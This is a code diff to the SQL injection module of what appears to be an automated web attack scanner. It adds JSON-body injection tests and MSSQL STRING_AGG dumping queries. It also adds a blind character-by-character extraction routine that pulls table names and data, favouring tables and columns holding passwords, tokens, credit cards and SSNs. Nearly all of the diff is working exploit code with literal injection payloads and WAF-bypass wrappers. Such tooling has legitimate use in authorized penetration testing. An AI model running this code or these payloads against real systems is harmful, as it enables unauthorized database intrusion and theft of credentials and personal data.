@@ -1,9 +1,24 @@
 import re
 import asyncio
+import json as json_lib
 from urllib.parse import quote, urljoin
 from modules.base import BaseModule
 from core.utils import extract_params, random_string
 from core.http import inject_param
+
+
+def _inject_json_param(body, param, payload):
+    if isinstance(body, dict):
+        out = dict(body)
+        out[param] = payload
+        return out
+    try:
+        data = json_lib.loads(body) if isinstance(body, str) else body
+        data = dict(data)
+        data[param] = payload
+        return data
+    except (TypeError, ValueError):
+        return {param: payload}
 
 
 class SqliModule(BaseModule):
@@ -123,6 +138,9 @@ class SqliModule(BaseModule):
             "tables": "SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP {offset} name FROM sysobjects WHERE xtype='U')",
             "columns": "SELECT TOP 1 name FROM syscolumns WHERE id=OBJECT_ID('{table}') AND name NOT IN (SELECT TOP {offset} name FROM syscolumns WHERE id=OBJECT_ID('{table}'))",
             "data": "SELECT TOP 1 {column} FROM {table} WHERE {column} NOT IN (SELECT TOP {offset} {column} FROM {table})",
+            "tables_agg": "SELECT STRING_AGG(CAST(name AS NVARCHAR(MAX)), ',') FROM sysobjects WHERE xtype='U'",
+            "columns_agg": "SELECT STRING_AGG(CAST(name AS NVARCHAR(MAX)), ',') FROM syscolumns WHERE id=OBJECT_ID('{table}')",
+            "data_agg": "SELECT STRING_AGG(CAST({column} AS NVARCHAR(MAX)), ',') FROM {table}",
             "concat": "CONCAT({args})",
             "concat_sep": "CHAR(124)",
         },
@@ -151,6 +169,7 @@ class SqliModule(BaseModule):
     
     interesting_tables = ["users", "admin", "accounts", "members", "credentials", "passwords", "login", "customers"]
     interesting_columns = ["password", "passwd", "pass", "pwd", "secret", "hash", "token", "api_key", "credit_card", "ssn", "email", "username", "user", "admin"]
+    json_body_params = ["emailID", "email", "username", "user", "id", "search", "q", "query", "name", "value", "data", "input", "filter", "key"]
     
     async def scan(self, target):
         self.findings = []
@@ -159,11 +178,20 @@ class SqliModule(BaseModule):
         self.injectable_payload = None
         self.union_columns = 0
         self.extracted_data = {}
+        self.body_json_sqli = False
+        self._json_baseline_body = None
         
         params = extract_params(target)
         
         if not params:
-            await self._test_path_sqli(target)
+            vuln = await self._test_json_body_sqli(target)
+            if not vuln:
+                await self._test_path_sqli(target)
+            if self.injectable_param and self.body_json_sqli:
+                self.log(f"[SQLi] Vulnerability confirmed (JSON body)! Starting exploitation...")
+                await self._exploit_sqli(target)
+            await self._test_header_sqli(target)
+            await self._test_nosql(target)
             return self.findings
         
         self.log(f"[SQLi] Testing {len(params)} parameters...")
@@ -179,6 +207,167 @@ class SqliModule(BaseModule):
         
         return self.findings
     
+    async def _req_param(self, target, param, payload):
+        if self.body_json_sqli:
+            body = _inject_json_param(self._json_baseline_body or {param: ""}, param, payload)
+            return await self.http.post(target, json=body, headers={"Content-Type": "application/json"})
+        test_url = inject_param(target, param, payload)
+        return await self.http.get(test_url)
+    
+    async def _baseline_for_param(self, target, param):
+        if self.body_json_sqli:
+            body = self._json_baseline_body or {param: "1"}
+            return await self.http.post(target, json=body, headers={"Content-Type": "application/json"})
+        return await self.http.get(target)
+    
+    async def _test_json_body_sqli(self, target):
+        self.log("[SQLi] Testing JSON body parameters...")
+        for param in self.json_body_params:
+            base_body = {param: "1"}
+            self._json_baseline_body = base_body
+            self.body_json_sqli = True
+            self.injectable_param = param
+            if await self._test_error_based_json(target, param):
+                return True
+            if await self._test_boolean_based_json(target, param):
+                return True
+            if await self._test_time_based_json(target, param):
+                return True
+        self.body_json_sqli = False
+        self.injectable_param = None
+        self._json_baseline_body = None
+        return False
+    
+    async def _test_error_based_json(self, target, param):
+        payloads = ["'", "\"", "' OR '1'='1", "1'", "' AND 1=CONVERT(int,(SELECT @@version))-- "]
+        
+        if self.aggressive:
+            from core.fuzzer import MutationEngine
+            mutator = MutationEngine()
+            mutated = []
+            for p in payloads:
+                mutated.extend(mutator.mutate_string(p, count=3))
+            payloads = list(dict.fromkeys(payloads + mutated))[:30]
+        
+        for payload in payloads:
+            for bypass in self.waf_bypasses[:3]:
+                test_payload = bypass(payload)
+                resp = await self._req_param(target, param, test_payload)
+                if resp.get("status"):
+                    for pattern, db_type in self.error_patterns:
+                        if re.search(pattern, resp["text"], re.IGNORECASE):
+                            self.detected_db = db_type
+                            self.injectable_payload = test_payload
+                            self.record_success(test_payload, target)
+                            
+                            confidence_evidence = ["error_message", "json_body_injection"]
+                            if db_type != "Unknown":
+                                confidence_evidence.append("database_fingerprint")
+                            
+                            self.add_finding(
+                                "CRITICAL",
+                                f"Error-based SQL Injection ({db_type}) in JSON body",
+                                url=target,
+                                parameter=param,
+                                evidence=f"Database: {db_type}, Key: {param}",
+                                confidence_evidence=confidence_evidence,
+                                request_data={"method": "POST", "url": target, "json": {param: test_payload}},
+                                response_data={"status": resp.get("status"), "text": resp.get("text", "")[:500]}
+                            )
+                            return True
+        return False
+    
+    async def _test_boolean_based_json(self, target, param):
+        test_cases = [
+            ("' OR '1'='1'-- ", "' AND '1'='2'-- "),
+            ("' OR 1=1-- ", "' AND 1=2-- "),
+            ("\" OR \"1\"=\"1", "\" AND \"1\"=\"2"),
+        ]
+        for true_payload, false_payload in test_cases:
+            true_responses = []
+            false_responses = []
+            
+            for _ in range(2):
+                true_resp = await self._req_param(target, param, true_payload)
+                false_resp = await self._req_param(target, param, false_payload)
+                if true_resp.get("status") and false_resp.get("status"):
+                    true_responses.append(true_resp)
+                    false_responses.append(false_resp)
+            
+            if len(true_responses) < 2:
+                continue
+            
+            behavior = self.detect_boolean_behavior(true_responses, false_responses)
+            
+            if behavior and behavior.get("is_boolean_behavior"):
+                self.injectable_payload = true_payload
+                
+                confidence_evidence = ["response_difference", "json_body_injection"]
+                if behavior.get("indicator") == "length":
+                    confidence_evidence.append("length_difference")
+                
+                self.add_finding(
+                    "HIGH",
+                    "Boolean-based Blind SQL Injection in JSON body",
+                    url=target,
+                    parameter=param,
+                    evidence=f"Indicator: {behavior.get('indicator')}, Confidence: {behavior.get('confidence', 0):.0%}",
+                    confidence_evidence=confidence_evidence,
+                    request_data={"method": "POST", "url": target, "json": {param: true_payload}}
+                )
+                return True
+        return False
+    
+    async def _test_time_based_json(self, target, param):
+        baseline_samples = []
+        for _ in range(3):
+            baseline = await self._req_param(target, param, "1")
+            if baseline.get("status"):
+                baseline_samples.append(baseline)
+        
+        if len(baseline_samples) < 2:
+            return False
+        
+        avg_baseline = sum(r.get("elapsed", 0) for r in baseline_samples) / len(baseline_samples)
+        
+        for db_type in ["MySQL", "MSSQL", "PostgreSQL"]:
+            payloads = self.time_payloads.get(db_type, [])
+            for payload_template, delay in payloads[:2]:
+                payload = payload_template.format(time=delay)
+                
+                timed_responses = []
+                for _ in range(2):
+                    resp = await self._req_param(target, param, payload)
+                    if resp.get("status"):
+                        timed_responses.append(resp)
+                
+                if not timed_responses:
+                    continue
+                
+                anomaly = self.detect_time_anomaly(timed_responses, avg_baseline)
+                
+                if anomaly and anomaly.get("is_anomaly"):
+                    avg_delay = anomaly.get("avg_time", 0)
+                    if avg_delay >= delay * 0.8:
+                        self.detected_db = db_type
+                        self.injectable_payload = payload
+                        
+                        confidence_evidence = ["time_delay", "json_body_injection"]
+                        if avg_delay >= delay:
+                            confidence_evidence.append("exact_delay_match")
+                        
+                        self.add_finding(
+                            "CRITICAL",
+                            f"Time-based Blind SQL Injection ({db_type}) in JSON body",
+                            url=target,
+                            parameter=param,
+                            evidence=f"Avg delay: {avg_delay:.2f}s (expected: {delay}s, baseline: {avg_baseline:.2f}s)",
+                            confidence_evidence=confidence_evidence,
+                            request_data={"method": "POST", "url": target, "json": {param: payload}}
+                        )
+                        return True
+        return False
+    
     async def _detect_sqli(self, target, params):
         for param in params:
             if await self._test_error_based(target, param):
@@ -190,9 +379,20 @@ class SqliModule(BaseModule):
         return False
     
     async def _test_error_based(self, target, param):
-        payloads = ["'", "\"", "' OR '1'='1", "1'", "1\"", "')", "'))",
-                    "' AND 1=CONVERT(int,(SELECT @@version))-- ",
-                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- "]
+        file_payloads = (self.get_payloads("sqli") or []) + (self.get_payloads("sqli_advanced") or [])
+        payloads = list(dict.fromkeys(file_payloads + [
+            "'", "\"", "' OR '1'='1", "1'", "1\"", "')", "'))",
+            "' AND 1=CONVERT(int,(SELECT @@version))-- ",
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- ",
+        ]))[:80]
+        
+        if self.aggressive:
+            from core.fuzzer import MutationEngine
+            mutator = MutationEngine()
+            mutated = []
+            for p in payloads[:20]:
+                mutated.extend(mutator.mutate_string(p, count=3))
+            payloads = list(dict.fromkeys(payloads + mutated))[:120]
         
         for payload in payloads:
             for bypass in self.waf_bypasses[:3]:
@@ -207,12 +407,19 @@ class SqliModule(BaseModule):
                             self.injectable_payload = test_payload
                             self.record_success(test_payload, target)
                             
+                            confidence_evidence = ["error_message", "database_fingerprint"]
+                            if db_type != "Unknown":
+                                confidence_evidence.append("specific_dbms")
+                            
                             self.add_finding(
                                 "CRITICAL",
                                 f"Error-based SQL Injection ({db_type})",
                                 url=target,
                                 parameter=param,
-                                evidence=f"Database: {db_type}, Error triggered with: {test_payload[:50]}"
+                                evidence=f"Database: {db_type}, Error triggered with: {test_payload[:50]}",
+                                confidence_evidence=confidence_evidence,
+                                request_data={"method": "GET", "url": target, "param": param, "payload": test_payload},
+                                response_data={"status": resp.get("status"), "text": resp.get("text", "")[:500]}
                             )
                             return True
         return False
@@ -226,55 +433,59 @@ class SqliModule(BaseModule):
             ("1) OR (1=1", "1) AND (1=2"),
         ]
         
-        baseline = await self.baseline_request(target)
-        if not baseline.get("status"):
-            return False
+        await self.establish_baseline(target)
         
         for true_payload, false_payload in test_cases:
-            true_resp = await self.test_param(target, param, true_payload)
-            false_resp = await self.test_param(target, param, false_payload)
+            true_responses = []
+            false_responses = []
             
-            if not (true_resp.get("status") and false_resp.get("status")):
+            for _ in range(2):
+                true_resp = await self.test_param(target, param, true_payload)
+                false_resp = await self.test_param(target, param, false_payload)
+                
+                if true_resp.get("status") and false_resp.get("status"):
+                    true_responses.append(true_resp)
+                    false_responses.append(false_resp)
+            
+            if len(true_responses) < 2:
                 continue
             
-            true_len = len(true_resp.get("text", ""))
-            false_len = len(false_resp.get("text", ""))
-            len_diff = abs(true_len - false_len)
+            behavior = self.detect_boolean_behavior(true_responses, false_responses)
             
-            if len_diff > 50:
+            if behavior and behavior.get("is_boolean_behavior"):
                 self.injectable_param = param
                 self.injectable_payload = true_payload
+                
+                confidence_evidence = ["response_difference", "consistent_behavior"]
+                if behavior.get("indicator") == "length":
+                    confidence_evidence.append("length_difference")
+                elif behavior.get("indicator") == "status":
+                    confidence_evidence.append("status_difference")
                 
                 self.add_finding(
                     "HIGH",
                     "Boolean-based Blind SQL Injection",
                     url=target,
                     parameter=param,
-                    evidence=f"Response length diff: {len_diff} bytes (true={true_len}, false={false_len})"
-                )
-                return True
-            
-            if true_resp["status"] != false_resp["status"]:
-                self.injectable_param = param
-                self.injectable_payload = true_payload
-                
-                self.add_finding(
-                    "HIGH",
-                    "Boolean-based Blind SQL Injection (status)",
-                    url=target,
-                    parameter=param,
-                    evidence=f"Status codes: true={true_resp['status']}, false={false_resp['status']}"
+                    evidence=f"Indicator: {behavior.get('indicator')}, Confidence: {behavior.get('confidence', 0):.0%}",
+                    confidence_evidence=confidence_evidence,
+                    request_data={"method": "GET", "url": target, "param": param, "payload": true_payload}
                 )
                 return True
         
         return False
     
     async def _test_time_based(self, target, param):
-        baseline = await self.http.timed_get(target)
-        if not baseline.get("status"):
+        baseline_samples = []
+        for _ in range(3):
+            baseline = await self.http.timed_get(target)
+            if baseline.get("status"):
+                baseline_samples.append(baseline)
+        
+        if len(baseline_samples) < 2:
             return False
         
-        baseline_time = baseline.get("elapsed", 0)
+        avg_baseline = sum(r.get("elapsed", 0) for r in baseline_samples) / len(baseline_samples)
         
         db_types = ["MySQL", "MSSQL", "PostgreSQL", "SQLite"]
         if self.detected_db:
@@ -287,22 +498,37 @@ class SqliModule(BaseModule):
                 payload = payload_template.format(time=delay)
                 test_url = inject_param(target, param, payload)
                 
-                resp = await self.http.timed_get(test_url)
+                timed_responses = []
+                for _ in range(2):
+                    resp = await self.http.timed_get(test_url)
+                    if resp.get("status"):
+                        timed_responses.append(resp)
                 
-                if resp.get("status"):
-                    elapsed = resp.get("elapsed", 0)
+                if not timed_responses:
+                    continue
+                
+                anomaly = self.detect_time_anomaly(timed_responses, avg_baseline)
+                
+                if anomaly and anomaly.get("is_anomaly"):
+                    avg_delay = anomaly.get("avg_time", 0)
                     
-                    if elapsed >= baseline_time + (delay - 1):
+                    if avg_delay >= delay * 0.8:
                         self.detected_db = db_type
                         self.injectable_param = param
                         self.injectable_payload = payload
+                        
+                        confidence_evidence = ["time_delay", "consistent_delay"]
+                        if avg_delay >= delay:
+                            confidence_evidence.append("exact_delay_match")
                         
                         self.add_finding(
                             "CRITICAL",
                             f"Time-based Blind SQL Injection ({db_type})",
                             url=target,
                             parameter=param,
-                            evidence=f"Response delayed by {elapsed:.2f}s (baseline: {baseline_time:.2f}s)"
+                            evidence=f"Avg delay: {avg_delay:.2f}s (expected: {delay}s, baseline: {avg_baseline:.2f}s)",
+                            confidence_evidence=confidence_evidence,
+                            request_data={"method": "GET", "url": target, "param": param, "payload": payload}
                         )
                         return True
         
@@ -340,13 +566,13 @@ class SqliModule(BaseModule):
             ]
             
             for payload, marker_payload in payloads:
-                resp = await self.test_param(target, self.injectable_param, payload)
+                resp = await self._req_param(target, self.injectable_param, payload)
                 
                 if resp.get("status") == 200:
                     has_error = any(re.search(p[0], resp.get("text", ""), re.IGNORECASE) for p in self.error_patterns)
                     
                     if not has_error:
-                        marker_resp = await self.test_param(target, self.injectable_param, marker_payload)
+                        marker_resp = await self._req_param(target, self.injectable_param, marker_payload)
                         if marker in marker_resp.get("text", ""):
                             self.union_columns = num_cols
                             self.log(f"[SQLi] Found {num_cols} columns (marker confirmed)!")
@@ -373,7 +599,7 @@ class SqliModule(BaseModule):
         
         try:
             payload = make_extraction_payload(schema["version"])
-            resp = await self.test_param(target, self.injectable_param, payload)
+            resp = await self._req_param(target, self.injectable_param, payload)
             if resp.get("status") == 200:
                 version_match = re.search(r'(\d+\.\d+\.\d+[-\w]*)', resp.get("text", ""))
                 if version_match:
@@ -384,10 +610,10 @@ class SqliModule(BaseModule):
         
         try:
             payload = make_extraction_payload(schema["current_db"])
-            resp = await self.test_param(target, self.injectable_param, payload)
+            resp = await self._req_param(target, self.injectable_param, payload)
             if resp.get("status") == 200:
                 text = resp.get("text", "")
-                baseline = await self.baseline_request(target)
+                baseline = await self._baseline_for_param(target, self.injectable_param)
                 baseline_text = baseline.get("text", "")
                 new_words = set(re.findall(r'\b\w+\b', text)) - set(re.findall(r'\b\w+\b', baseline_text))
                 if new_words:
@@ -403,7 +629,7 @@ class SqliModule(BaseModule):
             try:
                 query = schema["tables"].format(offset=i)
                 payload = make_extraction_payload(query)
-                resp = await self.test_param(target, self.injectable_param, payload)
+                resp = await self._req_param(target, self.injectable_param, payload)
                 
                 if resp.get("status") == 200:
                     text = resp.get("text", "")
@@ -427,7 +653,7 @@ class SqliModule(BaseModule):
             try:
                 query = f"SELECT {col} FROM {table} LIMIT 1"
                 payload = make_extraction_payload(query)
-                resp = await self.test_param(target, self.injectable_param, payload)
+                resp = await self._req_param(target, self.injectable_param, payload)
                 if resp.get("status") == 200 and "error" not in resp.get("text", "").lower():
                     return col
             except:
@@ -448,7 +674,7 @@ class SqliModule(BaseModule):
                         col_str = ",".join(columns[:3])
                         query = f"SELECT CONCAT({col_str}) FROM {table} LIMIT 1 OFFSET {i}"
                         payload = make_extraction_payload(query)
-                        resp = await self.test_param(target, self.injectable_param, payload)
+                        resp = await self._req_param(target, self.injectable_param, payload)
                         if resp.get("status") == 200:
                             text = resp.get("text", "")
                             data_match = re.search(r'([a-zA-Z0-9@._-]+:[a-zA-Z0-9@._-]+)', text)
@@ -505,7 +731,7 @@ class SqliModule(BaseModule):
             query = self.schema_queries.get(self.detected_db, {}).get("version", "@@version")
             payload = payload_template.format(query=query)
             
-            resp = await self.test_param(target, self.injectable_param, payload)
+            resp = await self._req_param(target, self.injectable_param, payload)
             if resp.get("status"):
                 text = resp.get("text", "")
                 version_match = re.search(r'~([^~]+)~|XPATH[^:]*: \'([^\']+)\'', text)
@@ -522,10 +748,48 @@ class SqliModule(BaseModule):
         
         return False
     
+    async def _blind_extract_string(self, target, subquery, max_len=200):
+        out = ""
+        for pos in range(1, max_len + 1):
+            found = False
+            for char_code in list(range(97, 123)) + list(range(48, 58)) + [44, 46, 32, 95]:
+                payload = f"' AND ASCII(LOWER(SUBSTRING(({subquery}),{pos},1)))={char_code} and '1'='1"
+                resp = await self._req_param(target, self.injectable_param, payload)
+                if self._blind_check_true(resp):
+                    out += chr(char_code)
+                    found = True
+                    break
+            if not found:
+                break
+        return out
+    
     async def _exploit_blind(self, target):
         self.log("[SQLi] Starting blind extraction (slow)...")
+        self._blind_false_body = None
+        if self.body_json_sqli:
+            false_resp = await self._req_param(target, self.injectable_param, "' AND '1'='2")
+            if false_resp.get("status") and len(false_resp.get("text", "")) < 500:
+                self._blind_false_body = false_resp.get("text", "")
         
         version = ""
+        schema = self.schema_queries.get(self.detected_db or "MySQL", self.schema_queries["MySQL"])
+        use_agg = self.detected_db == "MSSQL" and "tables_agg" in schema
+        
+        if use_agg:
+            tables_agg_query = schema["tables_agg"]
+            extracted = await self._blind_extract_string(target, tables_agg_query, max_len=150)
+            if extracted:
+                self.extracted_data.setdefault("tables_agg", []).append(extracted)
+                tables = [t.strip() for t in extracted.split(",") if t.strip()]
+                self.extracted_data.setdefault("tables", []).extend(tables)
+                self.add_finding(
+                    "CRITICAL",
+                    "Blind SQLi - Tables Extracted via STRING_AGG (MSSQL/Azure)",
+                    url=target,
+                    parameter=self.injectable_param,
+                    evidence=f"Tables: {extracted[:200]}"
+                )
+                return True
         
         for pos in range(1, 30):
             found = False
@@ -541,7 +805,7 @@ class SqliModule(BaseModule):
                     condition = f"ASCII(SUBSTR(sqlite_version(),{pos},1))={char_code}"
                 
                 payload = f"' AND {condition}-- "
-                resp = await self.test_param(target, self.injectable_param, payload)
+                resp = await self._req_param(target, self.injectable_param, payload)
                 
                 if self._blind_check_true(resp):
                     version += chr(char_code)
@@ -570,6 +834,8 @@ class SqliModule(BaseModule):
         if not resp.get("status"):
             return False
         text = resp.get("text", "")
+        if getattr(self, "_blind_false_body", None) is not None and len(text) < 500:
+            return text.strip() != self._blind_false_body.strip()
         return len(text) > 500
     
     async def _test_header_sqli(self, target):
